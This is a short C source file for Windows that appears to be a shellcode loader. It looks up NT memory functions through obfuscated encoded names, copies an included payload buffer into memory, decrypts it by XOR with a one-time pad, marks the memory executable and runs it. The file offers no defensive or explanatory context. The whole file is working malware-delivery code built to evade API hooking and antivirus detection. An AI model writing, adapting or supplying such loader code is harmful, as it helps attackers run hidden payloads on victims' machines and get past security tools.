#include <windows.h>
#include "payload.h"
#include "procaddr.h"

typedef NTSTATUS(NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);



int main() {
    NtAllocateVirtualMemory_t lNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)EncNtAddrOf(NTALLOCATEVIRTUALMEMORY_NAME);
    NtProtectVirtualMemory_t lNtProtectVirtualMemory = (NtProtectVirtualMemory_t)EncNtAddrOf(NTPROTECTVIRTUALMEMORY_NAME);
    
    PVOID virtualMemoryAddress = NULL;
    SIZE_T memoryLength = 0xBEEF;
    lNtAllocateVirtualMemory((HANDLE)-1, &virtualMemoryAddress, 0, &memoryLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(virtualMemoryAddress, buf, sizeof buf);

    for (int i = 0; i < sizeof otp; i++) {
        ((char*)virtualMemoryAddress)[i] ^= otp[i];
    }
    PVOID *virtualMemoryAddressPtr = &virtualMemoryAddress;
    ULONG oldProtect = 0;
    lNtProtectVirtualMemory((HANDLE)-1, virtualMemoryAddressPtr, &memoryLength, PAGE_EXECUTE_READ, &oldProtect);

    ((void(*)())virtualMemoryAddress)();
}